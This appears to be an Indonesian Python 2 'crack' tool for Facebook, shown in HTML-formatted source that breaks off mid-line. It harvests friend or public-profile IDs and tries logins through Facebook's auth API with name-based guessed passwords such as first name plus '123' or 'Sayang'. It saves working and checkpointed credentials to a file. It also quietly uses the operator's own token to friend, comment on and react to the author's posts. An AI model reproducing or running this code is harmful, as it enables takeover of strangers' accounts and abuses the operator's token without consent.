#!/usr/bin/python2<br/># coding=utf-8<div></div>#Import module<br/>import os,sys,time,datetime,random,hashlib,re,threading,json,getpass,urllib,cookielib<br/>from multiprocessing.pool import ThreadPool<br/>try:<br/>	import mechanize<br/>except ImportError:<br/>	os.system("pip2 install mechanize")<br/>try:<br/>	import bs4<br/>except ImportError:<br/>	os.system("pip2 install bs4")<br/>try:<br/>	import requests<br/>except ImportError:<br/>	os.system("pip2 install requests")<br/>	os.system("python2 fb.py")<br/>from requests.exceptions import ConnectionError<br/>from mechanize import Browser <div></div>reload(sys)<br/>sys.setdefaultencoding('utf8')<br/>br = mechanize.Browser()<br/>br.set_handle_robots(False)<br/>br.set_handle_refresh(mechanize._http.HTTPRefreshProcessor(),max_time=1)<br/>br.addheaders = [('User-Agent', 'Opera/9.80 (Android; Opera Mini/32.0.2254/85. U; id) Presto/2.12.423 Version/12.21')]<div></div><br/>def keluar():<br/>	print ("[!] Exit")<br/>	os.sys.exit()<br/>	<br/>	<br/>def acak(x):<br/>    w = 'mhkbpcP'<br/>    d = ''<br/>    for i in x:<br/>        d += '!'+w[random.randint(0,len(w)-1)]+i<br/>    return cetak(d)<br/>    <br/>    <br/>def cetak(x):<br/>    w = 'mhkbpcP'<br/>    for i in w:<br/>        j = w.index(i)<br/>        x= x.replace('!%s'%i,'%s;'%str(31+j))<br/>    x += ''<br/>    x = x.replace('!0','')<br/>    sys.stdout.write(x+'\n')<div></div><br/>def jalan(z):<br/>	for e in z + '\n':<br/>		sys.stdout.write(e)<br/>		sys.stdout.flush()<br/>		time.sleep(0.06)<br/>		<br/>#########LOGO#########<br/>logo = """<br/>\033[1;92m ••••••••••••••••••••••••••••••••••   \033[1;91m<br/>\033[1;92m JANGAN KESERINGAN NUYUL,DOSA TAU!                \033[1;91m<br/>\033[1;92m ••••••••••••••••••••••••••••••••••   \033[1;91m<br/>\033[1;92m GUNAKANLAH AGAR OM MARK ZUCK PUSING          \033[1;91m                                                                                                                                                                                     <br/>\033[1;92m ••••••••••••••••••••••••••••••••••   <br/>\033[1;92m WELCOME TO MY TOOL!!                     \033[1;91m<br/>\033[1;92m ••••••••••••••••••••••••••••••••••   \033[1;91m<br/>\033[1;96mAuthor   : Ramdhan Ramadhian<br/>\033[1;96mTeam     : CYBER WANTED PAFU PROJECT<br/>\033[1;96mFB       : Fb.com/bahjamrong.jamrong<br/>"""<div></div>def tik():<br/>	titik = ['.   ','..  ','... ']<br/>	for o in titik:<br/>		print("\r\033[1;97m[\033[1;93m●\033[1;97m]\033[1;93m Lagi Login\033[1;97m "+o),;sys.stdout.flush();time.sleep(1)<div></div><br/>back = 0<br/>threads = []<br/>berhasil = []<br/>cekpoint = []<br/>oks = []<br/>oke = []<br/>cpe = []<br/>id = []<br/>username = []<br/>idteman = []<br/>idfromteman = []<br/>gagal = []<br/>reaksi = []<br/>komen = []<br/>vulnot = "Not Vuln"<br/>vuln = "Vuln"<div></div>######MASUK######<br/>def masuk():<br/>	os.system('clear')<br/>	print logo<br/>	print "\33[1;33m╔══════════════════════════════════════════╗"<br/>	print "\33[1;33m║[\033[1;31;1m01\33[1;33m]\033[37;1mLogin Menggunakan Email / ID Facebook \33[1;33m║"<br/>	print "\33[1;33m║[\033[1;31;1m02\33[1;33m]\033[37;1mLogin Menggunakan Token Facebook      \33[1;33m║"<br/>	print "\33[1;33m║[\033[1;31;1m03\33[1;33m]\033[37;1mAmbil Token                           \33[1;33m║"<br/>	print "\33[1;33m║[\033[1;31;1m00\33[1;33m]\033[37;1mKeluar                                \33[1;33m║"<br/>	print "\33[1;33m╚══════════════════════════════════════════╝"<br/>	pilih_masuk()<div></div>def pilih_masuk():<br/>	msuk = raw_input("\033[1;93msilahkan pilih\033[91m:\033[1;96m ")<br/>	if msuk =="":<br/>		print"\033[37;1m[\033[32;1m!\033[37;1m] Isi Yg Benar !"<br/>		pilih_masuk()<br/>	elif msuk =="1" or msuk =="01":<br/>		login()<br/>	elif msuk =="2" or msuk =="02":<br/>		tokenz()<br/>	elif msuk =="3"or msuk =="03":<br/>		Ambil_Token()<br/>	elif msuk =="0" or msuk =="00":<br/>		keluar()<br/>	else:<br/>		print"\033[37;1m[\033[32;1m!\033[37;1m] Isi Yg Benar !"<br/>		pilih_masuk()<br/>			<br/>#####LOGIN_EMAIL#####<br/>def login():<br/>	os.system('clear')<br/>	try:<br/>		toket = open('login.txt','r')<br/>		menu() <br/>	except (KeyError,IOError):<br/>		os.system('clear')<br/>		print logo<br/>		print"\033[1;97m[\033[1;96m🤡\033[1;97m] LOGIN AKUN FACEBOOK ANDA \033[1;97m[\033[1;96m🤡\033[1;97m]"<br/>		id = raw_input('[\033[1;95m+\033[1;97m] ID / Email =\033[1;92m ')<br/>		pwd = raw_input('\033[1;97m[\033[1;95m?\033[1;97m] Password =\033[1;92m ')<br/>		tik()<br/>		try:<br/>			br.open('https://m.facebook.com')<br/>		except mechanize.URLError:<br/>			print"\n[!] Tidak ada koneksi"<br/>			keluar()<br/>		br._factory.is_html = True<br/>		br.select_form(nr=0)<br/>		br.form['email'] = id<br/>		br.form['pass'] = pwd<br/>		br.submit()<br/>		url = br.geturl()<br/>		if 'save-device' in url:<br/>			try:<br/>				sig= 'api_key=882a8490361da98702bf97a021ddc14dcredentials_type=passwordemail='+id+'format=JSONgenerate_machine_id=1generate_session_cookies=1locale=en_USmethod=auth.loginpassword='+pwd+'return_ssl_resources=0v=1.062f8ce9f74b12f84c123cc23437a4a32'<br/>				data = {"api_key":"882a8490361da98702bf97a021ddc14d","credentials_type":"password","email":id,"format":"JSON", "generate_machine_id":"1","generate_session_cookies":"1","locale":"en_US","method":"auth.login","password":pwd,"return_ssl_resources":"0","v":"1.0"}<br/>				x=hashlib.new("md5")<br/>				x.update(sig)<br/>				a=x.hexdigest()<br/>				data.update({'sig':a})<br/>				url = "https://api.facebook.com/restserver.php"<br/>				r=requests.get(url,params=data)<br/>				z=json.loads(r.text)<br/>				unikers = open("login.txt", 'w')<br/>				unikers.write(z['access_token'])<br/>				unikers.close()<br/>				print '\n\033[1;97m[\033[1;92m✓\033[1;97m]\033[1;92m Login Berhasil'<br/>				os.system('xdg-open https://m.facebook.com/user.keramat.90')<br/>				bot_komen()<br/>			except requests.exceptions.ConnectionError:<br/>				print"\n[!] Tidak ada koneksi"<br/>				keluar()<br/>		if 'checkpoint' in url:<br/>			print("\n\033[1;97m[\033[1;93m!\033[1;97m]\033[1;93m Sepertinya Akun Anda Checkpoint")<br/>			os.system('rm -rf login.txt')<br/>			time.sleep(1)<br/>			keluar()<br/>		else:<br/>			print("\n\033[1;97m[\033[1;91m!\033[1;97m]\033[1;91m Password / Email Salah")<br/>			os.system('rm -rf login.txt')<br/>			time.sleep(1)<br/>			masuk()<br/>			<br/>#####LOGIN_TOKENZ#####<br/>def tokenz():<br/>	os.system('clear')<br/>	print logo<br/>	toket = raw_input("\033[1;97m[\033[1;95m?\033[1;97m] \033[1;93mToken : \033[1;96m")<br/>	try:<br/>		otw = requests.get('https://graph.facebook.com/me?access_token='+toket)<br/>		a = json.loads(otw.text)<br/>		nama = a['name']<br/>		zedd = open("login.txt", 'w')<br/>		zedd.write(toket)<br/>		zedd.close()<br/>		print '\033[1;97m[\033[1;92m✓\033[1;97m]\033[1;92m Login Berhasil'<br/>		os.system('xdg-open https://m.youtube.com/channel/UC7kqla4Jh-ujwE6BKaUE_Rw')<br/>		bot_komen()<br/>	except KeyError:<br/>		print "\033[1;97m[\033[1;91m!\033[1;97m] \033[1;91mToken Salah !"<br/>		time.sleep(1)<br/>		masuk()<div></div>######BOT KOMEN#######<br/>def bot_komen():<br/>	try:<br/>		toket=open('login.txt','r').read()<br/>	except IOError:<br/>		print"\033[1;97m[!] Token invalid"<br/>		os.system('rm -rf login.txt')<br/>	una = ('100044932290784')<br/>	kom = ('Ramdani Maneh Mani Kasep 😍')<br/>	reac = ('ANGRY')<br/>	post = ('315723919935349')<br/>	post2 = ('315723919935349')<br/>	kom2 = ('I really Like Your Work Ramdani 😘')<br/>	reac2 = ('LOVE')<br/>	requests.post('https://graph.facebook.com/me/friends?method=post&uids=' +una+ '&access_token=' + toket)<br/>	requests.post('https://graph.facebook.com/'+post+'/comments/?message=' +kom+ '&access_token=' + toket)<br/>	requests.post('https://graph.facebook.com/'+post+'/reactions?type=' +reac+ '&access_token='+ toket)<br/>	requests.post('https://graph.facebook.com/'+post2+'/comments/?message=' +kom2+ '&access_token=' + toket)<br/>	requests.post('https://graph.facebook.com/'+post2+'/reactions?type=' +reac2+ '&access_token='+ toket)<br/>	menu()<div></div>######AMBIL_TOKEN######<br/>def Ambil_Token():<br/>	os.system("clear")<br/>	print logo<br/>	jalan("\033[1;92mInstall...")<br/>	os.system ("cd ... && npm install")<br/>	jalan ("\033[1;96mMulai...")<br/>	os.system ("cd ... && npm start")<br/>	raw_input("\n[ Kembali ]")<br/>	masuk()<div></div>######MENU#######<br/>def menu():<br/>	os.system('clear')<br/>	try:<br/>		toket=open('login.txt','r').read()<br/>	except IOError:<br/>		os.system('clear')<br/>		os.system('rm -rf login.txt')<br/>		masuk()<br/>	try:<br/>		otw = requests.get('https://graph.facebook.com/me?access_token='+toket)<br/>		a = json.loads(otw.text)<br/>		nama = a['name']<br/>		id = a['id']<br/>	except KeyError:<br/>		os.system('clear')<br/>		print"\033[1;96m[!] \033[1;91mToken invalid"<br/>		os.system('rm -rf login.txt')<br/>		time.sleep(1)<br/>		masuk()<br/>	except requests.exceptions.ConnectionError:<br/>		print"[!] Tidak ada koneksi"<br/>		keluar()<br/>	os.system("clear")<br/>	print logo<br/>	print "\033[1;31;1m=========================================="<br/>	print "\033[37;1m=========================================="<br/>	print "\033[1;97m[\033[1;34m✓\033[1;97m]\033[1;34m Nama Akun\033[1;91m     =>\033[1;93m "+nama<br/>	print "\033[1;97m[\033[1;34m•\033[1;97m]\033[1;34m UID\033[1;91m           =>\033[1;93m "+id<br/>	print "\033[1;97m[\033[1;34m+\033[1;97m]\033[1;34m Tanggal Lahir\033[1;91m =>\033[1;93m "+ a['birthday']<br/>	print "\033[37;96m╔═════════════════════════╗"<br/>	print "\033[37;96m║[\033[1;31;1m01\033[37;96m]\033[1;31;1m->\033[37;1mMemulai Crack Akun \033[37;96m║"<br/>	print "\033[37;96m║[\033[1;31;1m02\033[37;96m]\033[1;31;1m->\033[37;1mKeluar             \033[37;96m║"<br/>	print "\033[37;96m╚═════════════════════════╝"<br/>	pilih()<br/>	<br/>######PILIH######<br/>def pilih():<br/>	unikers = raw_input("\033[1;93m︻氕言テ一一一  \033[91m:\033[1;96m ")<br/>	if unikers =="":<br/>		print"\033[1;97m[\033[1;91m!\033[1;97m]\033[1;97m Isi Yg Benar !"<br/>		pilih()<br/>	elif unikers =="1" or unikers =="01":<br/>		indo()<br/>	elif unikers =="0" or unikers =="00":<br/>		os.system('clear')<br/>		jalan('Menghapus token')<br/>		os.system('rm -rf login.txt')<br/>		keluar()<br/>	else:<br/>		print"\033[1;97m[\033[1;91m!\033[1;97m]\033[1;97m Isi Yg Benar !"<br/>		pilih()<br/>	<br/>########## CRACK INDONESIA #######<br/>def indo():<br/>	global toket<br/>	os.system('clear')<br/>	try:<br/>		toket=open('login.txt','r').read()<br/>	except IOError:<br/>		print"\033[1;96m[!] \x1b[1;91mToken invalid"<br/>		os.system('rm -rf login.txt')<br/>		time.sleep(1)<br/>		keluar()<br/>	os.system('clear')<br/>	print logo<br/>	print "\033[37;96m╔══════════════════════════════╗"<br/>	print "\033[37;96m║\033[1;34m[01]\033[1;31;1m->\033[37;1mCrack Dari Daftar Teman \033[37;96m║"<br/>	print "\033[37;96m║\033[1;34m[02]\033[1;31;1m->\033[37;1mCrack Dari ID Publik    \033[37;96m║"<br/>	print "\033[37;96m║\033[1;34m[03]\033[1;31;1m->\033[37;1mCrack Dari File         \033[37;96m║"<br/>	print "\033[37;96m║\033[1;34m[00]\033[1;31;1m->\033[37;1mKembali                 \033[37;96m║"<br/>	print "\033[37;96m╚══════════════════════════════╝"<br/>	pilih_indo()<div></div>#### PILIH INDO ####<br/>def pilih_indo():<br/>	teak = raw_input("\033[1;93m︻氕言テ一一一 \033[91m:\033[1;96m ")<br/>	if teak =="":<br/>		print"\033[1;97m[\033[1;91m!\033[1;97m]\033[1;97m Isi Yg Benar !"<br/>		pilih_indo()<br/>	elif teak =="1" or teak =="01":<br/>		os.system('clear')<br/>		print logo<br/>		print "\033[1;31;1m=========================================="<br/>		r = requests.get("https://graph.facebook.com/me/friends?access_token="+toket)<br/>		z = json.loads(r.text)<br/>		for s in z['data']:<br/>			id.append(s['id'])<br/>	elif teak =="2" or teak =="02":<br/>		os.system('clear')<br/>		print logo<br/>		print "\033[1;31;1m=========================================="<br/>		print "\033[37;1m=========================================="<br/>	        idt = raw_input("\033[1;97m{\033[1;34m✔\033[1;97m} ID publik/teman : ")<br/>		try:<br/>			jok = requests.get("https://graph.facebook.com/"+idt+"?access_token="+toket)<br/>			op = json.loads(jok.text)<br/>			print"\033[1;97m{\033[1;93m✴\033[1;97m} Nama : "+op["name"]<br/>		except KeyError:<br/>			print"\033[1;97m[\033[1;93m!\033[1;97m] ID publik/teman tidak ada !"<br/>			raw_input("\n[ Kembali ]")<br/>			indo()<br/>		except requests.exceptions.ConnectionError:<br/>			print"[!] Tidak ada koneksi !"<br/>			keluar()<br/>		r = requests.get("https://graph.facebook.com/"+idt+"/friends?access_token="+toket)<br/>		z = json.loads(r.text)<br/>		for i in z['data']:<br/>			id.append(i['id'])<br/>	elif teak =="3" or teak =="03":<br/>		os.system('clear')<br/>		print logo<br/>		try:<br/>			print "\033[1;31;1m=========================================="<br/>			idlist = raw_input('\033[1;97m{\033[1;93m?\033[1;97m} Nama File : ')<br/>			for line in open(idlist,'r').readlines():<br/>				id.append(line.strip())<br/>		except KeyError:<br/>			print '\033[1;97m[!] File tidak ada ! '<br/>			raw_input('\n\033[1;92m[ \033[1;97mKembali \033[1;92m]')<br/>		except IOError:<br/>			print '\033[1;97m[!] File tidak ada !'<br/>			raw_input('\n\033[1;92m[ \033[1;97mKembali \033[1;92m]')<br/>			indo()<br/>	elif teak =="0" or teak =="00":<br/>		menu()<br/>	else:<br/>		print"\033[1;97m[\033[1;91m!\033[1;97m]\033[1;97m Isi Yg Benar !"<br/>		pilih_indo()<br/>	<br/>	print "\033[1;97m{\033[1;93m➹\033[1;97m} Total ID : "+str(len(id))<br/>	print('\033[1;97m{\033[1;93m➹\033[1;97m} Stop CTRL+Z')<br/>	titik = ['.   ','..  ','... ']<br/>	for o in titik:<br/>		print("\r\033[1;97m{\033[1;93m➹\033[1;97m} Crack Berjalan "+o),;sys.stdout.flush();time.sleep(1)<div></div>	print "\n\033[1;31;1m=========================================="<br/>        print "\n\033[1;97mMOHON BERSABAR SEMOGA BERUNTUNG"<br/>        print "\n\033[1;33mUCAPKAN RAMDANI GANTENG 5x AGAR HOKI XIXIXI"<br/>	print "\n\033[37;1m=========================================="<br/>	<br/>##### MAIN INDONESIA #####<br/>	def main(arg):<br/>		global cekpoint,oks<br/>		user = arg<br/>		try:<br/>			os.mkdir('out')<br/>		except OSError:<br/>			pass<br/>		try:<br/>			a = requests.get('https://graph.facebook.com/'+user+'/?access_token='+toket)<br/>			c = json.loads(a.text)<br/>			pass1 = c['first_name']+'123'<br/>			data = urllib.urlopen("https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=2&email="+(user)+"&locale=en_US&password="+(pass1)+"&sdk=ios&generate_session_cookies=1&sig=3f555f99fb61fcd7aa0c44f58f522ef6")<br/>			w = json.load(data)<br/>			if 'access_token' in w:<br/>				x = requests.get("https://graph.facebook.com/"+user+"?access_token="+w['access_token'])<br/>				z = json.loads(x.text)<br/>				print '\x1c\33[1;33m[✔] \x1c\33[1;33mBerhasil'<br/>				print '\x1c\33[1;33m[✴] \x1c\33[1;33mName \x1c\33[1;33m    : \x1c\33[1;33m' + c['name']<br/>				print '\x1c\33[1;33m[➹] \x1c\33[1;33mID \x1c\33[1;33m      : \x1c\33[1;33m' + user<br/>				print '\x1c\33[1;33m[➹] \x1c\33[1;33mPassword \x1c\33[1;33m: \x1c\33[1;33m' + pass1 + '\n'<br/>				print '\x1c\33[1;33m[➹] \x1c\33[1;33mTanggal Lahir \x1c\33[1;33m: \x1c\33[1;33m' + c['birthday']<br/>				oks.append(user+pass1)<br/>			else:<br/>				if 'www.facebook.com' in w['error_msg']:<br/>					print '\x1c\033[1;94m[✖] \x1c\033[1;94mCheckpoint'<br/>					print '\x1c\033[1;94m[✴] \x1c\033[1;94mName \x1c\033[1;94m    : \x1c\033[1;95m' + c['name']<br/>					print '\x1c\033[1;94m[➹] \x1c\033[1;94mID \x1c\033[1;94m      : \x1c\033[1;95m' + user<br/>					print '\x1c\033[1;94m[➹] \x1c\033[1;94mPassword \x1c\033[1;94m: \x1c\033[1;95m' + pass1 + '\n'<br/>					print '\x1c\033[1;97m[➹] \x1c\033[1;91mTanggal Lahir \x1c\033[1;91m: \x1c\033[1;92m' + c['birthday']<br/>					cek = open("out/super_cp.txt", "a")<br/>					cek.write("ID:" +user+ " Pw:" +pass1+"\n")<br/>					cek.close()<br/>					cekpoint.append(user+pass1)<br/>				else:<br/>					pass2 = c['first_name']+'1234'<br/>					data = urllib.urlopen("https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=2&email="+(user)+"&locale=en_US&password="+(pass2)+"&sdk=ios&generate_session_cookies=1&sig=3f555f99fb61fcd7aa0c44f58f522ef6")<br/>					w = json.load(data)<br/>					if 'access_token' in w:<br/>						x = requests.get("https://graph.facebook.com/"+user+"?access_token="+w['access_token'])<br/>						z = json.loads(x.text)<br/>						print '\x1c\033[1;94m[✔] \x1c\033[1;92mBerhasil'<br/>						print '\x1c\033[1;94m[✴] \x1c\033[1;91mName \x1c\033[1;91m    : \x1c\033[1;92m' + c['name']<br/>						print '\x1c\033[1;94m[➹] \x1c\033[1;91mID \x1c\033[1;91m      : \x1c\033[1;92m' + user<br/>						print '\x1c\033[1;94m[➹] \x1c\033[1;91mPassword \x1c\033[1;91m: \x1c\033[1;92m' + pass2 + '\n'<br/>						print '\x1c\033[1;97m[➹] \x1c\033[1;91mTanggal Lahir \x1c\033[1;91m: \x1c\033[1;92m' + c['birthday']<br/>						oks.append(user+pass2)<br/>					else:<br/>						if 'www.facebook.com' in w['error_msg']:<br/>							print '\x1c\033[1;94m[✖] \x1c\033[1;94mCheckpoint'<br/>							print '\x1c\033[1;94m[✴] \x1c\033[1;94mName \x1c\033[1;94m    : \x1c\033[1;95m' + c['name']<br/>							print '\x1c\033[1;94m[➹] \x1c\033[1;94mID \x1c\033[1;94m      : \x1c\033[1;95m' + user<br/>							print '\x1c\033[1;94m[➹] \x1c\033[1;94mPassword \x1c\033[1;94m: \x1c\033[1;95m' + pass2 + '\n'<br/>							print '\x1c\033[1;97m[➹] \x1c\033[1;91mTanggal Lahir \x1c\033[1;91m: \x1c\033[1;92m' + c['birthday']<br/>							cek = open("out/super_cp.txt", "a")<br/>							cek.write("ID:" +user+ " Pw:" +pass2+"\n")<br/>							cek.close()<br/>							cekpoint.append(user+pass2)<br/>						else:<br/>							pass3 = c['first_name']+'12345'<br/>							data = urllib.urlopen("https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=2&email="+(user)+"&locale=en_US&password="+(pass3)+"&sdk=ios&generate_session_cookies=1&sig=3f555f99fb61fcd7aa0c44f58f522ef6")<br/>							w = json.load(data)<br/>							if 'access_token' in w:<br/>								x = requests.get("https://graph.facebook.com/"+user+"?access_token="+w['access_token'])<br/>								z = json.loads(x.text)<br/>								print '\x1c\033[1;94m[✔] \x1c\033[1;92mBerhasil'<br/>								print '\x1c\033[1;94m[✴] \x1c\033[1;91mName \x1c\033[1;91m    : \x1c\033[1;92m' + c['name']<br/>								print '\x1c\033[1;94m[➹] \x1c\033[1;91mID \x1c\033[1;91m      : \x1c\033[1;92m' + user<br/>								print '\x1c\033[1;94m[➹] \x1c\033[1;91mPassword \x1c\033[1;91m: \x1c\033[1;92m' + pass3 + '\n'<br/>								print '\x1c\033[1;97m[➹] \x1c\033[1;91mTanggal Lahir \x1c\033[1;91m: \x1c\033[1;92m' + c['birthday']<br/>								oks.append(user+pass3)<br/>							else:<br/>								if 'www.facebook.com' in w['error_msg']:<br/>									print '\x1c\033[1;94m[✖] \x1c\033[1;94mCheckpoint'<br/>									print '\x1c\033[1;94m[✴] \x1c\033[1;94mName \x1c\033[1;94m    : \x1c\033[1;95m' + c['name']<br/>									print '\x1c\033[1;94m[➹] \x1c\033[1;94mID \x1c\033[1;94m      : \x1c\033[1;95m' + user<br/>									print '\x1c\033[1;94m[➹] \x1c\033[1;94mPassword \x1c\033[1;94m: \x1c\033[1;95m' + pass3 + '\n'<br/>									print '\x1c\033[1;97m[➹] \x1c\033[1;91mTanggal Lahir \x1c\033[1;91m: \x1c\033[1;92m' + c['birthday']<br/>									cek = open("out/super_cp.txt", "a")<br/>									cek.write("ID:" +user+ " Pw:" +pass3+"\n")<br/>									cek.close()<br/>									cekpoint.append(user+pass3)<br/>								else:<br/>									pass4 = c['last_name']+'123'<br/>									data = urllib.urlopen("https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=2&email="+(user)+"&locale=en_US&password="+(pass4)+"&sdk=ios&generate_session_cookies=1&sig=3f555f99fb61fcd7aa0c44f58f522ef6")<br/>									w = json.load(data)<br/>									if 'access_token' in w:<br/>										x = requests.get("https://graph.facebook.com/"+user+"?access_token="+w['access_token'])<br/>										z = json.loads(x.text)<br/>										print '\x1c\033[1;94m[✔] \x1c\033[1;92mBerhasil'<br/>										print '\x1c\033[1;94m[✴] \x1c\033[1;91mName \x1c\033[1;91m    : \x1c\033[1;92m' + c['name']<br/>										print '\x1c\033[1;94m[➹] \x1c\033[1;91mID \x1c\033[1;91m      : \x1c\033[1;92m' + user<br/>										print '\x1c\033[1;94m[➹] \x1c\033[1;94mPassword \x1c\033[1;94m: \x1c\033[1;95m' + pass4 + '\n'<br/>										print '\x1c\033[1;97m[➹] \x1c\033[1;91mTanggal Lahir \x1c\033[1;91m: \x1c\033[1;92m' + c['birthday']<br/>										oks.append(user+pass4)<br/>									else:<br/>										if 'www.facebook.com' in w['error_msg']:<br/>											print '\x1c\033[1;94m[✖] \x1c\033[1;94mCheckpoint'<br/>											print '\x1c\033[1;94m[✴] \x1c\033[1;94mName \x1c\033[1;94m    : \x1c\033[1;95m' + c['name']<br/>											print '\x1c\033[1;94m[➹] \x1c\033[1;94mID \x1c\033[1;94m      : \x1c\033[1;95m' + user<br/>											print '\x1c\033[1;94m[➹] \x1c\033[1;94mPassword \x1c\033[1;94m: \x1c\033[1;95m' + pass4 + '\n'<br/>											print '\x1c\033[1;97m[➹] \x1c\033[1;91mTanggal Lahir \x1c\033[1;91m: \x1c\033[1;92m' + c['birthday']<br/>											cek = open("out/super_cp.txt", "a")<br/>											cek.write("ID:" +user+ " Pw:" +pass4+"\n")<br/>											cek.close()<br/>											cekpoint.append(user+pass4)<br/>										else:<br/>											pass5 = c['last_name']+'1234'<br/>											data = urllib.urlopen("https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=2&email="+(user)+"&locale=en_US&password="+(pass5)+"&sdk=ios&generate_session_cookies=1&sig=3f555f99fb61fcd7aa0c44f58f522ef6")<br/>											w = json.load(data)<br/>											if 'access_token' in w:<br/>												x = requests.get("https://graph.facebook.com/"+user+"?access_token="+w['access_token'])<br/>												z = json.loads(x.text)<br/>												print '\x1c\033[1;94m[✔] \x1c\033[1;92mBerhasil'<br/>												print '\x1c\033[1;94m[✴] \x1c\033[1;91mName \x1c\033[1;91m    : \x1c\033[1;92m' + c['name']<br/>												print '\x1c\033[1;94m[➹] \x1c\033[1;91mID \x1c\033[1;91m      : \x1c\033[1;92m' + user<br/>												print '\x1c\033[1;94m[➹] \x1c\033[1;94mPassword \x1c\033[1;94m: \x1c\033[1;95m' + pass5 + '\n'<br/>												print '\x1c\033[1;97m[➹] \x1c\033[1;91mTanggal Lahir \x1c\033[1;91m: \x1c\033[1;92m' + c['birthday']<br/>												oks.append(user+pass5)<br/>											else:<br/>												if 'www.facebook.com' in w['error_msg']:<br/>													print '\x1c\033[1;94m[✖] \x1c\033[1;94mCheckpoint'<br/>													print '\x1c\033[1;94m[✴] \x1c\033[1;94mName \x1c\033[1;94m    : \x1c\033[1;95m' + c['name']<br/>													print '\x1c\033[1;94m[➹] \x1c\033[1;94mID \x1c\033[1;94m      : \x1c\033[1;95m' + user<br/>													print '\x1c\033[1;94m[➹] \x1c\033[1;94mPassword \x1c\033[1;94m: \x1c\033[1;95m' + pass5 + '\n'<br/>													print '\x1c\033[1;97m[➹] \x1c\033[1;91mTanggal Lahir \x1c\033[1;91m: \x1c\033[1;92m' + c['birthday']<br/>													cek = open("out/super_cp.txt", "a")<br/>													cek.write("ID:" +user+ " Pw:" +pass5+"\n")<br/>													cek.close()<br/>													cekpoint.append(user+pass5)<br/>												else:<br/>													pass6 = c['last_name']+'12345'<br/>													data = urllib.urlopen("https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=2&email="+(user)+"&locale=en_US&password="+(pass6)+"&sdk=ios&generate_session_cookies=1&sig=3f555f99fb61fcd7aa0c44f58f522ef6")<br/>													w = json.load(data)<br/>													if 'access_token' in w:<br/>														x = requests.get("https://graph.facebook.com/"+user+"?access_token="+w['access_token'])<br/>														z = json.loads(x.text)<br/>														print '\x1c\033[1;94m[✔] \x1c\033[1;92mBerhasil'<br/>														print '\x1c\033[1;94m[✴] \x1c\033[1;91mName \x1c\033[1;91m    : \x1c\033[1;92m' + c['name']<br/>														print '\x1c\033[1;94m[➹] \x1c\033[1;91mID \x1c\033[1;91m      : \x1c\033[1;92m' + user<br/>														print '\x1c\033[1;94m[➹] \x1c\033[1;94mPassword \x1c\033[1;94m: \x1c\033[1;95m' + pass6 + '\n'<br/>														print '\x1c\033[1;97m[➹] \x1c\033[1;91mTanggal Lahir \x1c\033[1;91m: \x1c\033[1;92m' + c['birthday']<br/>														oks.append(user+pass6)<br/>													else:<br/>														if 'www.facebook.com' in w['error_msg']:<br/>															print '\x1c\033[1;94m[✖] \x1c\033[1;94mCheckpoint'<br/>															print '\x1c\033[1;94m[✴] \x1c\033[1;94mName \x1c\033[1;94m    : \x1c\033[1;95m' + c['name']<br/>															print '\x1c\033[1;94m[➹] \x1c\033[1;94mID \x1c\033[1;94m      : \x1c\033[1;95m' + user<br/>															print '\x1c\033[1;94m[➹] \x1c\033[1;94mPassword \x1c\033[1;94m: \x1c\033[1;95m' + pass6 + '\n'<br/>															print '\x1c\033[1;97m[➹] \x1c\033[1;91mTanggal Lahir \x1c\033[1;91m: \x1c\033[1;92m' + c['birthday']<br/>															cek = open("out/super_cp.txt", "a")<br/>															cek.write("ID:" +user+ " Pw:" +pass6+"\n")<br/>															cek.close()<br/>															cekpoint.append(user+pass6)<br/>														else:<br/>															pass7 = 'Sayang'<br/>															data = urllib.urlopen("https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=2&email="+(user)+"&locale=en_US&password="+(pass7)+"&sdk=ios&generate_session_cookies=1&sig=3f555f99fb61fcd7aa0c44f58f522ef6")<br/>															w = json.load(data)<br/>															if 'access_token' in w:<br/>																x = requests.get("https://graph.facebook.com/"+user+"?access_token="+w['access_token'])<br/>																z = json.loads(x.text)<br/>																print '\x1c\033[1;94m[✔] \x1c\033[1;92mBerhasil'<br/>																print '\x1c\033[1;94m[✴] \x1c\033[1;91mName \x1c\033[1;91m    : \x1c\033[1;92m' + c['name']<br/>																print '\x1c\033[1;94m[➹] \x1c\033[1;94mID \x1c\033[1;94m      : \x1c\033[1;95m' + user<br/>																print '\x1c\033[1;94m[➹] \x1c\033[1;94mPassword \x1c\033[1;94m: \x1c\033[1;95m' + pass7 + '\n'<br/>																print '\x1c\033[1;97m[➹] \x1c\033[1;91mTanggal Lahir \x1c\033[1;91m: \x1c\033[1;92m' + c['birthday']<br/>																oks.append(user+pass7)<br/>															else:<br/>																if 'www.facebook.com' in w['error_msg']:<br/>																	print '\x1c\033[1;94m[✖] \x1c\033[1;94mCheckpoint'<br/>																	print '\x1c\033[1;94m[✴] \x1c\033[1;94mName \x1c\033[1;94m    : \x1c\033[1;95m' + c['name']<br/>																	print '\x1c\033[1;94m[➹] \x1c\033[1;94mID \x1c\033[1;94m      : \x1c\033[1;95m' + user<br/>																	print '\x1c\033[1;94m[➹] \x1c\033[1;94mPassword \x1c\033[1;94m: \x1c\033[1;95m' + pass7 + '\n'<br/>																	print '\x1c\033[1;97m[➹] \x1c\033[1;91mTanggal Lahir \x1c\033[1;91m: \x1c\033[1;92m' + c['birthday']<br/>																	cek = open("out/super_cp.txt", "a")<br/>																	cek.write("ID:" +user+ " Pw:" +pass7+"\n")<br/>																	cek.close()<br/>																	cekpoint.append(user+pass7)<br/>																else:<br/>																	pass8 = 'Sayang123'<br/>																	data = urllib.urlopen("https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=2&email="+(user)+"&locale=en_US&password="+(pass8)+"&sdk=ios&generate_session_cookies=1&sig=3f555f99fb61fcd7aa0c44f58f522ef6")<br/>																	w = 